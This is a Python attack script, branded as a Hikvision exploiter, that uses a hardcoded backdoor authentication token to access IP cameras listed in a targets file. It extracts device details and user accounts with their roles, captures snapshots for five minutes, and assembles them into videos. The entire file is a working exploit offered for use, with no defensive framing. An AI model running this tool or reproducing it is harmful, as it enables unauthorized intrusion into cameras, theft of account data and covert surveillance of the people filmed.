import requests
import os
import time
from datetime import datetime, timedelta
import subprocess
import signal
from concurrent.futures import ThreadPoolExecutor
import xml.etree.ElementTree as ET

# Directory path to check
directory_path = "/onvif-http/snapshot?auth=YWRtaW46MTEK"

# Paths for additional information
device_info_path = "/System/deviceInfo?auth=YWRtaW46MTEK"
user_info_path = "/Security/users?auth=YWRtaW46MTEK"

# Create a directory to save snapshots
os.makedirs("snapshots", exist_ok=True)

# ANSI color codes
class Color:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"

# Global flag to handle interrupt
interrupted = False

# Function to print the banner
def print_banner():
    banner = f"""
{Color.GREEN}
============================================================
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

Contact me on:
Instagram : @hex_buddy
Telegram : @HexBuddy127001
============================================================
{Color.RESET}
"""
    print(banner)

# Function to read targets from targets.txt
def read_targets(file_path):
    try:
        with open(file_path, 'r') as file:
            targets = [line.strip() for line in file if line.strip()]
        return targets
    except FileNotFoundError:
        print(f"{Color.RED}[-] Error: {file_path} not found!{Color.RESET}")
        return []

# Function to check if a directory is accessible
def check_directory(ip_port):
    url = f"http://{ip_port}{directory_path}"
    try:
        response = requests.head(url, timeout=10)
        if response.status_code == 200:
            print(f"{Color.GREEN}[+] Directory is accessible: {url}{Color.RESET}")
            return url
    except Exception as e:
        print(f"{Color.RED}[-] Error checking directory: {e} ({url}){Color.RESET}")
    return None

# Function to fetch and parse XML data
def fetch_xml_data(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return ET.fromstring(response.content)
        else:
            print(f"{Color.YELLOW}[-] Failed to retrieve XML data from {url}{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Error fetching XML data: {e} ({url}){Color.RESET}")
    return None

# Function to print device information
def print_device_info(ip_port):
    url = f"http://{ip_port}{device_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        print(f"{Color.BLUE}[+] Device information for {ip_port}:{Color.RESET}")
        for child in xml_data:
            print(f"{Color.GREEN}{child.tag.split('}')[-1].replace('device', 'Device ')}: {child.text}{Color.RESET}")

# Function to print user information
def print_user_info(ip_port):
    url = f"http://{ip_port}{user_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        print(f"{Color.BLUE}[+] Users and roles for {ip_port}:{Color.RESET}")
        for user in xml_data:
            username_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userName')
            user_level_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userLevel')
            if username_element is not None and user_level_element is not None:
                username = username_element.text
                user_level = user_level_element.text
                print(f"{Color.GREEN}{username}: {user_level}{Color.RESET}")
            else:
                print(f"{Color.RED}[-] Error: Missing username or user level data.{Color.RESET}")
    else:
        print(f"{Color.YELLOW}[-] Failed to retrieve user information from {url}{Color.RESET}")

# Function to download snapshots
def download_snapshots(url, folder):
    end_time = datetime.now() + timedelta(minutes=5)
    index = 0
    while datetime.now() < end_time and not interrupted:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                filename = os.path.join(folder, f"{index:04d}.jpg")
                with open(filename, 'wb') as f:
                    f.write(response.content)
                print(f"{Color.BLUE}[+] Snapshot saved: {filename}{Color.RESET}")
            else:
                print(f"{Color.YELLOW}[-] Failed to download snapshot from {url}{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}[-] Error: {e} ({url}){Color.RESET}")
        time.sleep(0.5)  # Wait 0.5 seconds between snapshots
        index += 1

# Function to create video from snapshots
def create_video(folder):
    input_pattern = os.path.join(folder, "%04d.jpg")
    output_file = os.path.join(folder, "output.mp4")
    command = [
        "ffmpeg", "-framerate", "2", "-i", input_pattern,  # 2 frames per second for half-second intervals
        "-c:v", "libx264", "-pix_fmt", "yuv420p", output_file
    ]
    subprocess.run(command)
    print(f"{Color.GREEN}[+] Video created: {output_file}{Color.RESET}")

# Function to handle SIGINT (Ctrl+C)
def handle_sigint(signum, frame):
    global interrupted
    interrupted = True
    print(f"{Color.YELLOW}[-] Interrupted! Finalizing videos...{Color.RESET}")

# Main function
def main():
    # Print the banner
    print_banner()

    # Register the signal handler
    signal.signal(signal.SIGINT, handle_sigint)

    # Read targets from targets.txt
    targets = read_targets("targets.txt")
    if not targets:
        print(f"{Color.RED}[-] No targets found. Exiting.{Color.RESET}")
        return

    accessible_urls = []

    # Check each directory for accessibility
    print(f"{Color.BLUE}Checking directories...{Color.RESET}")
    for ip_port in targets:
        if interrupted:
            break
        url = check_directory(ip_port)
        if url:
            accessible_urls.append(url)
            print_device_info(ip_port)
            print_user_info(ip_port)
    print(f"{Color.BLUE}Directory check complete. Accessible directories found: {len(accessible_urls)}{Color.RESET}")

    # Download snapshots and create videos
    with ThreadPoolExecutor() as executor:
        futures = []
        for url in accessible_urls:
            folder_name = url.split('//')[1].replace(':', '_').replace('/', '_')
            os.makedirs(f"snapshots/{folder_name}", exist_ok=True)
            futures.append(executor.submit(download_snapshots, url, f"snapshots/{folder_name}"))

        # Wait for downloads to complete or interruption
        while futures:
            for future in futures:
                try:
                    future.result(timeout=1)
                except Exception as e:
                    futures.remove(future)
            if interrupted:
                break

    # Create videos from snapshots
    print(f"{Color.BLUE}Creating videos...{Color.RESET}")
    for url in accessible_urls:
        folder_name = url.split('//')[1].replace(':', '_').replace('/', '_')
        create_video(f"snapshots/{folder_name}")

    print(f"{Color.GREEN}Done!{Color.RESET}")

if __name__ == "__main__":
    main()
